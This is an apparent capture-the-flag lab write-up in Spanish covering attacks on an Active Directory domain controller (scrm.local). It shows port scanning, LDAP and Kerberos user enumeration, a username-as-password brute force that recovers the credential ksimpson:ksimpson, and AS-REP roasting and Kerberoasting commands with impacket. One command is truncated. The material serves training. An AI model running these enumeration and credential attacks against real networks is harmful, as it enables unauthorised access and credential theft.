
# Reconocimiento

```shell
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.129.8.117 -oG allPorts
```

```shell
[*] IP Address: 10.129.8.117
[*] Open ports: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49668,49675,49676,49701,49704,56405
```

```shell
nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49668,49675,49676,49701,49704,56405 -sCV 10.129.8.117 -oN targeted
```

```shell
nxc smb 10.129.8.117
```

```shell
[*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
```

## LDAP

Verificar el dominio a través de LDAP
```shell
ldapsearch -x -H ldap://10.129.8.117 -s base namingcontexts
```

Enumerar el dominio encontrado
```shell
ldapsearch -x -H ldap://10.129.8.117 -b "DC=scrm,DC=local"
```

No encontramos nada relevante en este caso

## HTTP
Encontramos una web en la que podemos seleccionar los servicios IT y en una imagen encontramos un nombre de usuario llamado `ksimpson` el cual podemos validar usando `KERBEROS`

Nos lo guardamos en un archivo y usamos [[KERBRUTE]] para validarlo
```shell
kerbrute userenum -d scrm.local --dc 10.129.8.117 users
```

```ad-hint
[+] VALID USERNAME:   ksimpson@scrm.local
```

## KERBEROS
### Enumeración de usuarios validos
enumeraremos mas usuarios validos a demas de el anteriormente encontrando usando [[KERBRUTE]]
```shell
kerbrute userenum -d scrm.local --dc 10.129.8.117 /usr/share/wordlists/kerberos_enum_userlists/A-ZSurnames.txt
```

Obteniendo como resultado
```ad-hint
[+] VALID USERNAME:   ASMITH@scrm.local
[+] VALID USERNAME:   JHALL@scrm.local
[+] VALID USERNAME:   KSIMPSON@scrm.local
[+] VALID USERNAME:   KHICKS@scrm.local
[+] VALID USERNAME:   SJENKINS@scrm.local
```


Nos lo guardamos en un fichero `users`
Al tener una lista de usuarios validos hay que probar *SIEMPRE* a hacer un `AS-REP ROAST Attack`

#### AS-REP ROAST Attack
Usaremos la herramienta de [[IMPACKET]]
```shell
impacket-GetNPUsers -no-pass -usersfile users scrm.local/(
```

En este caso no obtendremos los TGT de los usuarios


### User as Password
Probamos a usar el nombre de usuario como contraseña usando la herramienta de [[KERBRUTE]]
```shell
kerbrute bruteuser --dc 10.129.8.117 -d scrm.local users ksimpson
```

En este caso vemos que el usuario `ksimpson` utiliza su nombre como contraseña

Una vez con estas credenciales validas probaremos un `KERBEROASTING Attack`

#### KERBEROASTING Attack
Usaremos la herramienta de  [[IMPACKET]]
```shell
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson
```

En caso de que nos este dando error al operar mediante `NTLM` por que puede ser que este deshabilitada podemos operar por `KERBEROS` con la misma herramienta pero usando

```shell
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
```
